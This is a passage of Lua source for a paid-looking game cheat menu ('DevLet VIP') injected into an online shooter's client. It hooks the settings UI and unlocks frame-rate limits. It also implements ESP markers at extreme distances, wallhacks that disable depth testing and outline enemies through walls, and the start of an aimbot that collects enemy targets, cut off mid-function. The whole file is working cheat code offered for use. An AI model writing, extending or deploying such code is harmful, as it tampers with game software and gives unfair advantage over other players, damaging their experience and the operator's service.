            { Key = "ModMenu_BlackSky", UI = AliasMap.Switcher, Text = "BLACK Sky", GetFunc = function() return _G.GTLMODConfig.BlackSky end, SetFunc = function(c,v) _G.GTLMODConfig.BlackSky = v return true end },
        }

        -- ==================== COLOR MOD ====================
        local StackColorMod = {
            { Key = "ModMenu_WallhackV2", UI = AliasMap.Switcher, Text = "WALLHACK V1", GetFunc = function() return _G.GTLMODConfig.WallhackV2 end, SetFunc = function(c,v) _G.GTLMODConfig.WallhackV2 = v return true end },
            { Key = "ModMenu_WallColor", UI = AliasMap.Switcher, Text = "WALLHACK V2", GetFunc = function() return _G.GTLMODConfig.wallhackng end, SetFunc = function(c,v) _G.GTLMODConfig.wallhackng = v; _G.GTLMODConfig.ColorBodyV2 = v return true end },
            { Key = "ModMenu_HDRGlow", UI = AliasMap.Switcher, Text = "GLOW HDR V2", GetFunc = function() return _G.GTLMODConfig.HDRGlow end, SetFunc = function(c,v) _G.GTLMODConfig.HDRGlow = v return true end },
            { Key = "ModMenu_WallVehicle", UI = AliasMap.Switcher, Text = "VEHICLE WALLHACK (See Through Walls)", GetFunc = function() return _G.GTLMODConfig.WallVehicle end, SetFunc = function(c,v) _G.GTLMODConfig.WallVehicle = v return true end },
            { Key = "COLOR_Visible", UI = AliasMap.Switcher, Text = "Visible Color (ESP & WH)",
              SwitcherText = {"Red","White","Yellow","Green","Cyan","Blue","Purple"},
              SwitcherValue = {1,2,3,4,5,6,7},
              GetFunc = function() return _G.ColorConfig.VisibleColor end,
              SetFunc = function(_, v) _G.ColorConfig.VisibleColor = v; _G.SaveModSettings(); return true end },
            { Key = "COLOR_Invisible", UI = AliasMap.Switcher, Text = "Invisible Color (ESP & WH)",
              SwitcherText = {"Red","White","Yellow","Green","Cyan","Blue","Purple"},
              SwitcherValue = {1,2,3,4,5,6,7},
              GetFunc = function() return _G.ColorConfig.InvisibleColor end,
              SetFunc = function(_, v) _G.ColorConfig.InvisibleColor = v; _G.SaveModSettings(); return true end },
            { Key = "COLOR_Brightness", UI = AliasMap.Slider, Text = "Brightness (1-50)", Min = 1, Max = 50, Step = 1,
              GetFunc = function() return _G.ColorConfig.Brightness end,
              SetFunc = function(_, v) _G.ColorConfig.Brightness = v; _G.SaveModSettings(); return true end },
            { Key = "COLOR_Glow", UI = AliasMap.Slider, Text = "Glow Intensity (0-10) (WH)", Min = 0, Max = 10, Step = 0.5,
              GetFunc = function() return _G.ColorConfig.Glow end,
              SetFunc = function(_, v) _G.ColorConfig.Glow = v; _G.SaveModSettings(); return true end }
        }

        -- ==================== DEFINE MENU PAGE ====================
        SettingPageDefine.ModMenu = {
            Key = "ModMenu",
            Text= "DevLet MENU",
            UIKey = "Setting_Page_Privacy", 
            Category = {
                { Key = "Cat_ESP_Visual", Text= "ESP FEATURES", Stack = StackESPVisual },
                { Key = "Cat_Aimbot_Force", Text= "AIMBOT", Stack = StackAimbotForce },
                { Key = "Cat_ColorMod", Text= "WALLHACK & COLOR", Stack = StackColorMod },
                { Key = "Cat_Combat_Graphic", Text= "SDK FEATURES", Stack = StackCombatGraphic },
            }
        }
        
        table.insert(SettingCatalog, 1, SettingPageDefine.ModMenu)
    end

    local UIManager = _G.UIManager
    if UIManager and not UIManager._IsModMenuHooked then
        local old_ShowUI = UIManager.ShowUI
        UIManager.ShowUI = function(config, ...)
            local args = {...}
            local n = select('#', ...) 
            
            if config and config.keyName and (string.find(string.lower(config.keyName), "setting_main") or string.find(string.lower(config.keyName), "setting")) then
                local catalog = args[1]
                if type(catalog) == "table" then
                    local hasModMenu = false
                    for _, page in ipairs(catalog) do
                        if type(page) == "table" and page.Key == "ModMenu" then
                            hasModMenu = true
                            break
                        end
                    end
                    if not hasModMenu then
                        table.insert(catalog, 1, SettingPageDefine.ModMenu)
                    end
                end
            end
            local table_unpack = table.unpack or unpack
            return old_ShowUI(config, table_unpack(args, 1, n))
        end
        UIManager._IsModMenuHooked = true
    end
end

local function ShowGTLMODVIPMenu()
    if _G.GTLMODMenuAlreadyShown then return end
    if _G.GTLMODState.MenuStep ~= 0 then return end

    pcall(function()
        local Msg = require("client.slua.logic.common.logic_common_msg_box")
        if not Msg or type(Msg.Show) ~= "function" then return end

        local WELCOME_TEXT = table.concat({
            "╔══════════════════════════════════╗",
            "║       DevLet VIP MOD MENU        ║",
            "╚══════════════════════════════════╝",
            "",
            "  SYSTEM INFORMATION",
            "  ──────────────────────────────",
            "  ●  Connection Status : Active",
            "  ●  Module Status     : Initialized",
            "  ●  Security Status   : Enabled",
            "",
            "  AVAILABLE FEATURES",
            "  ──────────────────────────────",
            "  ✓  Advanced Aim Assistance",
            "  ✓  Wallhack & ESP System",
            "  ✓  Visibility Detection",
            "  ✓  iPad View Configuration",
            "  ✓  White Body Customization",
            "  ✓  Additional Advanced Features",
            "",
            "  ──────────────────────────────",
            "  Developer & Administrator",
            "  @DevLet",
            "",
            "  Thank you for choosing DevLet VIP.",
        }, "\n")

        local function OnConfirm()
            if type(_G.InitModMenuTab) == "function" then
                _G.InitModMenuTab()
            end
            if type(Notify) == "function" then
                Notify("DevLet VIP MOD MENU | Configure your features through the main menu.")
            end
            _G.GTLMODMenuAlreadyShown = true
        end

        local function OnCancel() end

        _G.GTLMODState.MenuStep = 1
        Msg.Show(1, "DevLet VIP | SYSTEM INFORMATION", WELCOME_TEXT, OnConfirm, OnCancel, "CONTINUE", "CLOSE")
    end)
end

-- ========================================== 
-- LOGIC 165 FPS IPAD VIEW 
-- ========================================== 
local function InitializeGraphicsUnlock() 
    if isExpired then return end
    if _G.GTLMODState.GraphicsUnlocked or currentTime > limitTime then return end

    pcall(function()
        local SettingCfg = require("client.logic.setting.setting_config")
        local GraphicSettingDB = require("client.slua.umg.NewSetting.GraphicsNew.GraphicSettingDB")
        local logic_setting_graphics = require("client.slua.logic.setting.logic_setting_graphics")
        local GSC_FPS = require("client.slua.umg.NewSetting.GraphicsNew.Comps.GSC_FPS")
        local GSC_FPSFT = require("client.slua.umg.NewSetting.GraphicsNew.Comps.GSC_FPSFT")
        
        local KismetMathLibrary = import("KismetMathLibrary") or _G.KismetMathLibrary
        local FLinearColor = import("LinearColor") or _G.FLinearColor

        -- View range unlock
        if SettingCfg then
            if SettingCfg.TpViewValue then SettingCfg.TpViewValue.max = 160 end
            if SettingCfg.FpViewValue then SettingCfg.FpViewValue.max = 160 end
        end
        if GraphicSettingDB then
            if GraphicSettingDB.TpViewValue then GraphicSettingDB.TpViewValue.max = 160 end
        end

        if logic_setting_graphics then
            local old_SetFPS = logic_setting_graphics.SetFPS
            function logic_setting_graphics.SetFPS(gameInstance, FPSLevel)
                if old_SetFPS then old_SetFPS(gameInstance, FPSLevel) end
                if FPSLevel == 8 then 
                    gameInstance:ExecuteCMD("t.MaxFPS", "165")
                    gameInstance:ExecuteCMD("r.FrameRateLimit", "165")
                end
            end
        end

        if GSC_FPS and GSC_FPS.__inner_impl then
            local fps_impl = GSC_FPS.__inner_impl
            function fps_impl:GetMaxFPSLevel() return 8, 8 end
            function fps_impl:InitRealSupportFPS()
                local RealSupportFPS = {}
                for i = 1, 8 do RealSupportFPS[i] = {true, true} end
                if GraphicSettingDB then GraphicSettingDB:UpdateUIData(GraphicSettingDB.RealSupportFPS, RealSupportFPS, false) end
                return RealSupportFPS
            end
            function fps_impl:UpdateSelectedFPSState(selectedLevel)
                if not slua.isValid(self.UIRoot) then return end
                for level = 2, 8 do
                    local name = "NodeFps" .. (({[2]=20,[3]=25,[4]=30,[5]=40,[6]=60,[7]=90,[8]=120})[level] or 120)
                    local widget = self.UIRoot[name]
                    if slua.isValid(widget) then
                        widget:SetIsEnabled(true) 
                        pcall(function() widget:SetRenderOpacity(1.0) end)
                        local switcher = self.UIRoot["WidgetSwitcher_" .. level]
                        if slua.isValid(switcher) then 
                            switcher:SetActiveWidgetIndex(level == selectedLevel and 0 or 1) 
                        end
                    end
                end
            end
        end

        if GSC_FPSFT and GSC_FPSFT.__inner_impl then
            local ft_impl = GSC_FPSFT.__inner_impl
            local NMinFPS, NStep = 90, 5
            local function clamp(value, min, max)
                if value < min then return min end
                if max < value then return max end
                return value
            end
            local function lerp(a, b, t) return a + (b - a) * t end
            local function _getColorByPercent(start, finish, percent)
                if not FLinearColor then return nil end
                return FLinearColor(lerp(start.R, finish.R, percent), lerp(start.G, finish.G, percent), lerp(start.B, finish.B, percent), lerp(start.A, finish.A, percent))
            end
            
            ft_impl.ShowOrHide = function(self)
                self:SelfHitTestInvisible()
                if self.InitFPSFTSwitch then self:InitFPSFTSwitch() end
            end

            ft_impl.InitFPSFTSwitch = function(self)
                local FPSFineTuneSwitch = GraphicSettingDB:GetUIData(GraphicSettingDB.FPSFineTuneSwitch)
                if self.UIRoot.Setting_Switch then self.UIRoot.Setting_Switch:SetSwitcherEnable2(FPSFineTuneSwitch, true) end
                if self.UIRoot.CanvasPanel_8 then self:SetWidgetVisible(self.UIRoot.CanvasPanel_8, FPSFineTuneSwitch) end
                if self.UIRoot.WidgetSwitcher_0 then self.UIRoot.WidgetSwitcher_0:SetActiveWidgetIndex(2) end
                if self.InitFPSFTValue165 then self:InitFPSFTValue165() end
            end

            ft_impl.InitFPSFTValue165 = function(self)
                local itemRoot = self.UIRoot
                local FPSFineTuneSwitch = GraphicSettingDB:GetUIData(GraphicSettingDB.FPSFineTuneSwitch)
                local FPSFineTuneNum = 165
                if FPSFineTuneSwitch then
                    FPSFineTuneNum = GraphicSettingDB:GetUIData(GraphicSettingDB.FPSFineTuneNum) or 165
                    itemRoot.Slider_screen3:SetLocked(false)
                    if FLinearColor then
                        itemRoot.ProgressBar_screen3:SetFillColorAndOpacity(FLinearColor(1.0, 1.0, 1.0, 1.0))
                        itemRoot.Slider_screen3:SetSliderHandleColor(FLinearColor(1.0, 1.0, 1.0, 1.0))
                    end
                else
                    itemRoot.Slider_screen3:SetLocked(true)
                    if FLinearColor then
                        itemRoot.ProgressBar_screen3:SetFillColorAndOpacity(FLinearColor(1.0, 0.625, 0.6, 1))
                        itemRoot.Slider_screen3:SetSliderHandleColor(FLinearColor(1.0, 0.625, 0.6, 1.0))
                    end
                end
                local FPSFineTunePer = (FPSFineTuneNum - NMinFPS) / (165 - NMinFPS)
                
                itemRoot.Veihclescreen3:SetText(tostring(FPSFineTuneNum))
                itemRoot.Slider_screen3:SetValue(FPSFineTunePer)
                itemRoot.ProgressBar_screen3:SetPercent(FPSFineTunePer)
                
                if FLinearColor then
                    local startColor = FLinearColor(1.0, 1.0, 1.0, 1.0)
                    local midColor = FLinearColor(1.0, 0.54, 0.11, 1.0)
                    local endColor = FLinearColor(1.0, 0.23, 0.15, 1.0)
                    local sliderColor = FPSFineTunePer < 0.4 and startColor or _getColorByPercent(midColor, endColor, (FPSFineTunePer - 0.4) / 0.6)
                    itemRoot.Slider_screen3:SetSliderHandleColor(sliderColor)
                end
            end

            ft_impl.OnFPSFTValueChange3 = function(self, FPSFineTuneNum)
                GraphicSettingDB:UpdateUIData(GraphicSettingDB.FPSFineTuneNum, FPSFineTuneNum)
                if self.InitFPSFTValue165 then self:InitFPSFTValue165() end
                if self:GetParentUI() then self:GetParentUI():SetDirty(true) end
                local gameInstance = GraphicSettingDB.GetGameInstance and GraphicSettingDB.GetGameInstance()
                if gameInstance then
                    gameInstance:ExecuteCMD("t.MaxFPS", tostring(FPSFineTuneNum))
                    gameInstance:ExecuteCMD("r.FrameRateLimit", tostring(FPSFineTuneNum))
                end
            end

            ft_impl.OnFPSFTSliderValueChange3 = function(self, value)
                if GraphicSettingDB:GetUIData(GraphicSettingDB.FPSFineTuneSwitch) and KismetMathLibrary then
                    local FPSFineTuneNum = KismetMathLibrary.FCeil(value * (165 - NMinFPS) / NStep) * NStep + NMinFPS
                    self:OnFPSFTValueChange3(clamp(FPSFineTuneNum, NMinFPS, 165))
                end
            end
            
            ft_impl.OnFPSFTAdd = ft_impl.OnFPSFTAdd3
            ft_impl.OnFPSFTMinus = ft_impl.OnFPSFTMinus3
            ft_impl.OnFPSFTAdd2 = ft_impl.OnFPSFTAdd3
            ft_impl.OnFPSFTMinus2 = ft_impl.OnFPSFTMinus3
            ft_impl.OnFPSFTSliderValueChange = ft_impl.OnFPSFTSliderValueChange3
            ft_impl.OnFPSFTSliderValueChange2 = ft_impl.OnFPSFTSliderValueChange3
        end
    end)
    _G.GTLMODState.GraphicsUnlocked = true
    Notify("Graphics & FPS 165Hz Unlocked (Upgraded Version)")
end

-- ========================================== 
-- INITIALIZE THE ESP SYSTEM (BASED)
-- ========================================== 
local function InitializeNativeESP() 
    if _G.GTLMODState.NativeESPReady then return end
    pcall(function() 
        local currentMarkCfg = GamePlayTools.GetCurrentConfig("ScreenMarkConfig") 
        local function ApplyCfg(cfg)
            if not cfg then return end 
            if cfg[1006] then 
                cfg[1006].bBindBlocked = true;
                cfg[1006].bBindOutScreen = true; 
                cfg[1006].MaxWidgetNum = 99
                cfg[1006].MaxShowDistance = 6000000; 
                cfg[1006].bScaleByDistance = false
                cfg[1006].BindSocketName = "root"; 
                cfg[1006].bUseLuaWorldSocketName = true
                cfg[1006].WorldPositionOffset = FVector(0, 0, -30) 
            end 
            cfg[8888] = { 
                UIPathName = "/Game/Mod/EvoBase/BluePrints/UIBP/QuickSign/QuickSign_TipHitEnemy_UIBP_New.QuickSign_TipHitEnemy_UIBP_New_C",
                MaxWidgetNum = 99, 
                MaxShowDistance = 6000000, 
                bBindOutScreen = true,
                bBindBlocked = true, 
                bIsBindingActor = true,
                BindSocketName = "head",
                bUseLuaWorldSocketName = true, 
                WorldPositionOffset = FVector(0, 0, 30),
                bNeedPreLoad = true,
                Priority = 2 
            } 
            cfg[9999] = { 
                UIPathName = "/Game/Mod/EvoBase/BluePrints/UIBP/QuickSign/QuickSign_TipHitEnemy_UIBP_New.QuickSign_TipHitEnemy_UIBP_New_C",
                MaxWidgetNum = 99, 
                MaxShowDistance = 6000000, 
                bScaleByDistance = false,   -- [v4.8] 360m par bhi text/meter readable
                bBindOutScreen = true,
                bBindBlocked = true, 
                bIsBindingActor = true, 
                BindSocketName = "head",
                bUseLuaWorldSocketName = true, 
                WorldPositionOffset = FVector(0, 0, 50),
                bNeedPreLoad = true, 
                Priority = 2 
            } 
        end 
        ApplyCfg(currentMarkCfg) 
        for k, cfg in pairs(package.loaded) do 
            if type(k) == "string" and string.find(k, "ScreenMarkConfig") and type(cfg) == "table" then 
                ApplyCfg(cfg) 
            end 
        end 
    end)
    _G.GTLMODState.NativeESPReady = true 
    Notify("Native ESP System Initialized") 
end

-- ========================================== 
-- LOCAL FUNCTIONS CHO LOGIC NEW ESP - OPTIMIZED
-- ========================================== 
local function GetAllSkeletalMeshes(enemy, markData)
    local curTime = os.clock()
    if markData and markData.CachedMeshes and markData.CachedMeshTime and (curTime - markData.CachedMeshTime) < 3.0 then
        local validMeshes = {}
        for _, cachedMesh in ipairs(markData.CachedMeshes) do
            if Valid(cachedMesh) then table.insert(validMeshes, cachedMesh) end
        end
        markData.CachedMeshes = validMeshes
        return validMeshes
    end

    local meshes = {}
    if Valid(enemy.Mesh) then table.insert(meshes, enemy.Mesh) end
    pcall(function()
        local SkeletalMeshClass = import("SkeletalMeshComponent")
        if SkeletalMeshClass and type(enemy.GetComponentsByClass) == "function" then
            local childs = enemy:GetComponentsByClass(SkeletalMeshClass)
            if childs then
                local count = type(childs.Num) == "function" and childs:Num() or #childs
                for i = 1, count do
                    local comp = type(childs.Get) == "function" and childs:Get(i-1) or childs[i]
                    if Valid(comp) and comp ~= enemy.Mesh then
                        table.insert(meshes, comp)
                    end
                end
            end
        end
    end)
    if markData then
        markData.CachedMeshes = meshes
        markData.CachedMeshTime = curTime
    end
    return meshes
end

-- ========================================== 
-- WALL-BOUND FUNCTION & ROOT RESTORE (menggunakan ColorConfig)
-- ==========================================
-- ==========================================
-- APNA CHARACTER NORMAL RAKHO
-- Wallhack `bDisableDepthTest` shared BASE MATERIAL par lagta hai, isliye wo
-- hamare apne character par bhi leak ho jata hai. Yahan har tick apne meshes
-- ka depth-test wapas on kar dete hain taake hum normal dikhein.
-- ==========================================
_G.SelfMeshState = _G.SelfMeshState or {}

local function RestoreSelfCharacter(player)
    pcall(function()
        if not Valid(player) then return end
        local meshes = GetAllSkeletalMeshes(player, _G.SelfMeshState)
        for _, mesh in ipairs(meshes) do
            if Valid(mesh) then
                pcall(function()
                    if type(mesh.SetRenderCustomDepth) == "function" then mesh:SetRenderCustomDepth(false) end
                    if type(mesh.SetCustomDepthStencilValue) == "function" then mesh:SetCustomDepthStencilValue(0) end
                end)
                for i = 0, 10 do
                    local matInterface = mesh:GetMaterial(i)
                    if not Valid(matInterface) then break end
                    local baseMat = matInterface:GetBaseMaterial()
                    if Valid(baseMat) then
                        baseMat.bDisableDepthTest = false
                    end
                end
            end
        end
    end)
end

local function Undowallhackng(enemy, markData)
    pcall(function()
        if markData.WallhackApplied then
            local meshes = GetAllSkeletalMeshes(enemy, markData)
            for _, mesh in ipairs(meshes) do
                if Valid(mesh) then
                    pcall(function() if type(mesh.SetRenderCustomDepth) == "function" then mesh:SetRenderCustomDepth(false) end end)
                    for i = 0, 10 do 
                        local matInterface = mesh:GetMaterial(i)
                        if Valid(matInterface) then
                            local baseMat = matInterface:GetBaseMaterial()
                            if Valid(baseMat) then baseMat.bDisableDepthTest = false end
                        end
                    end
                end
            end
            markData.WallhackApplied = false
        end
    end)
end

-- ==========================================
-- STRONG VISIBILITY CHECK (shared + cached 0.3s)
-- Normal ray fail ho to UE ke alternate checks (head/extra offsets) try karta hai
-- Isi ka result saare colors use karte hain: wallhack, ESP name, box
-- ==========================================
local ZERO_VIEWPOINT = {X=0, Y=0, Z=0}

local function IsEnemyVisibleStrong(enemy, pc, markData)
    if not Valid(enemy) or not Valid(pc) then return false end
    if type(pc.LineOfSightTo) ~= "function" then return false end

    local curTime = os.clock()
    -- Cache: 0.3s se pehle dobara ray nahi daalte (CPU bachane ke liye)
    if markData and markData.LastVisCheckTime and (curTime - markData.LastVisCheckTime) <= 0.3 then
        if markData.CachedVisible ~= nil then return markData.CachedVisible end
    end

    local visible = false

    -- 1) Normal check (enemy ke center par ek ray)
    pcall(function()
        if pc:LineOfSightTo(enemy) then visible = true end
    end)

    -- NOTE: pehle yahan bAlternateChecks=true wala doosra check tha. Wo bohat
    -- permissive nikla -- deewar ke peeche wale enemy ko bhi "visible" bata deta tha,
    -- isliye color kabhi red nahi hota tha. Ab sirf standard check.

    if markData then
        markData.LastVisCheckTime = curTime
        markData.CachedVisible = visible
        markData.CachedHiddenState = not visible
    end
    return visible
end

-- ==========================================================
-- WALLHACK V2 -- game ke apne DYEING system par
-- Farq: yahan visible aur occluded ka rang ENGINE khud alag karta hai
-- (per-pixel), isliye rang bilkul saaf rehta hai. V1 (material MID +
-- bDisableDepthTest) mein rang mix ho jate the.
-- ==========================================================
local V2_CONSOLE_READY = false
local V2_AVATAR_SLOTS = {0,1,2,3,4,5,6,7}

local function V2_SetupConsole()
    if V2_CONSOLE_READY then return end
    pcall(function()
        local KSL = import("KismetSystemLibrary")
        local world = slua.getWorld()
        if not KSL or not world then return end
        KSL.ExecuteConsoleCommand(world, "r.EnableDrawDyeingColor 1")
        KSL.ExecuteConsoleCommand(world, "r.CustomDepth 3")
        KSL.ExecuteConsoleCommand(world, "r.IdeaOutline.Enable 1")
        KSL.ExecuteConsoleCommand(world, "r.Highlight.Enable 1")
        V2_CONSOLE_READY = true
    end)
end

local function V2_ApplyToMesh(mesh, visColor, occColor)
    if not Valid(mesh) then return end
    pcall(function()
        mesh:SetDrawDyeing(true)
        mesh:SetDrawDyeingMode(1)
        mesh:SetVisibleDyeingColor(visColor)
        mesh:SetOccludedDyeingColor(occColor)
        mesh:SetDyeingColorFadeDistance(99999.0)
        mesh:SetDyeingColorMinMaxDistance(0.0, 99999.0)
        mesh:SetDrawHighlight(true)
        mesh:OverrideHighlightColor(visColor)
        mesh:SetHighlightCanBeOccluded(false)
        mesh:SetDrawIdeaOutline(true)
        mesh:SetIdeaOutlineNew(true)
        mesh:SetIdeaOutlineOcclusionHighlight(true)
        mesh:OverrideIdeaOutlineColor(visColor)
        mesh:SetIdeaOutlineOcclusionColor(occColor)
        mesh:OverrideIdeaOutlineThickness(20.0)
        mesh:SetIdeaOverrideOutlineAndOcclusion(true)
        mesh:SetRenderCustomDepth(true)
        mesh:SetCustomDepthStencilValue(255)
    end)
end

local function V2_ClearMesh(mesh)
    if not Valid(mesh) then return end
    pcall(function()
        mesh:SetDrawDyeing(false)
        mesh:SetDrawHighlight(false)
        mesh:SetDrawIdeaOutline(false)
        mesh:SetIdeaOverrideOutlineAndOcclusion(false)
        mesh:SetRenderCustomDepth(false)
        mesh:SetCustomDepthStencilValue(0)
    end)
end

-- Enemy ke saare meshes: body + avatar slots (helmet/vest/bag) + weapon
-- V2_ForEachMesh: uses GetAllSkeletalMeshes cache (3s) to avoid double GetComponentsByClass scan
-- Avatar slots (0-7) handled via avatarComp, weapon mesh added separately.
-- OLD: called GetComponentsByClass twice (SkeletalMesh + StaticMesh) every frame -- now cached.
local function V2_ForEachMesh(enemy, fn, markData)
    -- 1) Body mesh (always fastest)
    if Valid(enemy.Mesh) then pcall(fn, enemy.Mesh) end

    -- 2) Avatar slots (helmet, vest, bag, etc.) -- no GetComponentsByClass needed
    pcall(function()
        local avatarComp = enemy.CharacterAvatarComp2_BP
        if not avatarComp and type(enemy.getAvatarComponent2) == "function" then
            avatarComp = enemy:getAvatarComponent2()
        end
        if avatarComp and avatarComp.GetMeshCompBySlot then
            for _, slot in ipairs(V2_AVATAR_SLOTS) do
                local m = avatarComp:GetMeshCompBySlot(slot)
                if Valid(m) and m ~= enemy.Mesh then fn(m) end
            end
        end
    end)

    -- 3) All other SkeletalMesh components -- use 3s cache (GetAllSkeletalMeshes)
    pcall(function()
        local meshes = GetAllSkeletalMeshes(enemy, markData or {})
        for _, m in ipairs(meshes) do
            if m ~= enemy.Mesh then fn(m) end
        end
    end)

    -- 4) Weapon mesh
    pcall(function()
        if type(enemy.GetCurrentWeapon) ~= "function" then return end
        local w = enemy:GetCurrentWeapon()
        if Valid(w) and Valid(w.Mesh) then fn(w.Mesh) end
    end)
end

local function ApplyWallhackV2(enemy, markData)
    pcall(function()
        V2_SetupConsole()

        local LC = import("LinearColor") or _G.FLinearColor
        if not LC then return end

        -- Rang ColorConfig se -- HDR values (100) taake saaf chamke
        local bri  = _G.ColorConfig.Brightness or 25
        local vRaw = GetAppliedColor(_G.ColorConfig.VisibleColor   or 4, bri)
        local oRaw = GetAppliedColor(_G.ColorConfig.InvisibleColor or 1, bri)
        local visColor = LC(vRaw.R / 255 * 100, vRaw.G / 255 * 100, vRaw.B / 255 * 100, 100)
        local occColor = LC(oRaw.R / 255 * 100, oRaw.G / 255 * 100, oRaw.B / 255 * 100, 100)

        V2_ForEachMesh(enemy, function(m) V2_ApplyToMesh(m, visColor, occColor) end)
        markData.V2Applied = true
    end)
end

local function UndoWallhackV2(enemy, markData)
    if not markData.V2Applied then return end
    pcall(function()
        V2_ForEachMesh(enemy, function(m) V2_ClearMesh(m) end)
    end)
    markData.V2Applied = false
end

local function Applywallhackng(enemy, markData)
    pcall(function()
        local meshes = GetAllSkeletalMeshes(enemy, markData)
        for _, mesh in ipairs(meshes) do
            if Valid(mesh) then 
                pcall(function()
                    if type(mesh.SetRenderCustomDepth) == "function" then
                        mesh:SetRenderCustomDepth(true)
                    end
                    if type(mesh.SetCustomDepthStencilValue) == "function" then
                        mesh:SetCustomDepthStencilValue(252) 
                    end
                end)
                for i = 0, 10 do 
                    local matInterface = mesh:GetMaterial(i)
                    if not Valid(matInterface) then break end
                    local baseMat = matInterface:GetBaseMaterial()
                    if Valid(baseMat) then
                        baseMat.bDisableDepthTest = true
                        baseMat.BlendMode = 2 
                    end
                end
            end
        end
    end)
end

-- ==========================================
-- MATERIAL PARAMETER NAMES (centralized -- no duplicate string literals)
-- ==========================================
local MAT_PARAMS = {
    "颜色", "Extra Light Color", "Para_Color", "Para_ColorTint",
    "Para_Color_1", "Tint", "Color", "BaseColor",
    "BodyColor", "MainColor", "DiffuseColor", "EmissiveColor"
}
local MAT_SCALE_PARAM = "ParaScaleOffset"

-- ==========================================
-- WALLHACK WITH COLOR FROM COLORCONFIG
-- ==========================================
local function ApplyColorBodyV2(enemy, pc, markData)
    pcall(function()
        local meshes = GetAllSkeletalMeshes(enemy, markData)
        if #meshes == 0 then return end
        
        -- STRONG visibility check (shared helper, khud cache karta hai)
        local hidden = not IsEnemyVisibleStrong(enemy, pc, markData)
        -- WALLHACK BODY COLOR -- source ke bilkul mutabiq.
        -- Ahem farq: source A = 25 aur intensity ~150 use karta hai, A = 255 nahi.
        -- Yehi kam alpha scope/x-ray wala do-rangi look deta hai. A = 255 par body
        -- solid ho jati hai aur scope ke andar ka farq khatam ho jata hai.
        local WH_ALPHA = 25
        local function ToWallhackColor(c)
            return {
                R = (c.R or 0) * 150 / 255,
                G = (c.G or 0) * 150 / 255,
                B = (c.B or 0) * 150 / 255,
                A = WH_ALPHA
            }
        end

        local visibleColor   = ToWallhackColor(GetAppliedColor(_G.ColorConfig.VisibleColor or 4, _G.ColorConfig.Brightness))
        local invisibleColor = ToWallhackColor(GetAppliedColor(_G.ColorConfig.InvisibleColor or 1, _G.ColorConfig.Brightness))
        local finalColor = hidden and invisibleColor or visibleColor
        
        local colorHash = string.format("%d_%d_%d_%d", finalColor.R, finalColor.G, finalColor.B, finalColor.A)
        local currentMeshCount = #meshes
        local isMeshChanged = (markData.LastMeshCount ~= currentMeshCount)
        
        if not isMeshChanged and markData.LastHiddenState == hidden and markData.LastColorHash == colorHash then return end
        
        if isMeshChanged and markData.MIDs then
            markData.MIDs = {}
        end

        markData.LastHiddenState = hidden
        markData.LastMeshCount = currentMeshCount
        markData.LastColorHash = colorHash
        markData.ColorApplied = true
        
        for meshIndex, mesh in ipairs(meshes) do
            if Valid(mesh) then
                pcall(function()
                    mesh.LDMaxDrawDistance = -99999
                    mesh.MaxDrawDistanceOffset = -99999
                    mesh.CachedMaxDrawDistance = -99999
                    mesh.UseScopeDistanceCulling = true
                    mesh.PrimitiveShadingStrategy = 1
                    mesh.ShadingRate = 6
                end)
                for i = 0, 10 do
                    local matInterface = mesh:GetMaterial(i)
                    if not Valid(matInterface) then break end
                    local baseMat = matInterface:GetBaseMaterial()
                    if Valid(baseMat) then
                        local matName = tostring(baseMat)
                        if string.find(matName, "Master_Mask", 1, true) then
                            if not markData.MIDs then markData.MIDs = {} end
                            
                            local meshKey = "Mesh_" .. tostring(meshIndex)
                            
                            if not markData.MIDs[meshKey] then markData.MIDs[meshKey] = {} end
                            local mid = markData.MIDs[meshKey][i]
                            if not Valid(mid) then
                                mid = mesh:CreateAndSetMaterialInstanceDynamic(i)
                                markData.MIDs[meshKey][i] = mid
                            end
                            if Valid(mid) then
                                -- Use MAT_PARAMS table (no duplicate string literals)
                                for _, paramName in ipairs(MAT_PARAMS) do
                                    mid:SetVectorParameterValue(paramName, finalColor)
                                end
                                mid:SetVectorParameterValue(MAT_SCALE_PARAM, SCALE_COLOR_V2)
                            end
                        end
                    end
                end
            end
        end
    end)
end

local function UndoColorBodyV2(enemy, markData)
    pcall(function()
        if markData.ColorApplied then
            local meshes = GetAllSkeletalMeshes(enemy, markData)
            for meshIndex, mesh in ipairs(meshes) do
                if Valid(mesh) then
                    pcall(function()
                        mesh.PrimitiveShadingStrategy = 0
                        mesh.ShadingRate = 1
                    end)
                    local meshKey = "Mesh_" .. tostring(meshIndex)
                    if markData.MIDs and markData.MIDs[meshKey] then
                        for i, mid in pairs(markData.MIDs[meshKey]) do
                            if Valid(mid) then
                                local defC = {R=1, G=1, B=1, A=1}
                                for _, paramName in ipairs(MAT_PARAMS) do
                                    mid:SetVectorParameterValue(paramName, defC)
                                end
                            end
                        end
                    end
                end
            end
            markData.ColorApplied = false
            markData.LastColorHash = ""
            markData.LastHiddenState = nil
        end
    end)
end

-- ========================================== 
-- AIMBOT V2 SYSTEM WITH NEW INTEGRATED TECHNOLOGY (KISSMET SMOOTH UPDATE)
-- ========================================== 
_G.GetEnemyTargetsFromActors = function(radius)
    local result = {}
    local player = GameplayData.GetPlayerCharacter()

    if not slua.isValid(player) then
        return result
    end

    local allCharacters = {}
    if GameplayData.GetAllPlayerCharacters then
        allCharacters = GameplayData.GetAllPlayerCharacters()
    elseif GameplayData.GameCharacters then
        for _, char in pairs(GameplayData.GameCharacters) do table.insert(allCharacters, char) end
    end

    local myTeam = player:GetTeamID()

    for _, actor in pairs(allCharacters) do
        if slua.isValid(actor) and actor ~= player and actor.GetTeamID and actor:IsAlive() then
            if actor:GetTeamID() ~= myTeam then
                local dist = player:GetDistanceTo(actor)
                if dist <= radius then
                    table.insert(result, actor)
                end
            end
        end
    end
    return result
end

do
local AimState = { lastT = nil }
local AimTouchImpl = function()
    local CFGM = _G.GTLMODConfig
    local CTD  = _G.GTLMODState.CustomTextData

    local nowT = os.clock()
    local aimDt = nowT - (AimState.lastT or (nowT - 0.016))
    AimState.lastT = nowT
    if aimDt < 0.008 then aimDt = 0.008 elseif aimDt > 0.05 then aimDt = 0.05 end

    if not CFGM.AimTouchEnable then return end

    local player = GameplayData.GetPlayerCharacter()
    if not slua.isValid(player) then return end

    local inSpecialState = false
    if EPawnState and type(player.HasState) == "function" then
        local okA, a  = pcall(player.HasState, player, EPawnState.SpecialSuit)
        if okA and a then inSpecialState = true end
        local okB, b2 = pcall(player.HasState, player, EPawnState.AttachToOther)
        if okB and b2 then inSpecialState = true end
    end
    if inSpecialState then return end

    local pc = player:GetPlayerControllerSafety()
    if not slua.isValid(pc) then return end

    local isFiring = player.bIsWeaponFiring
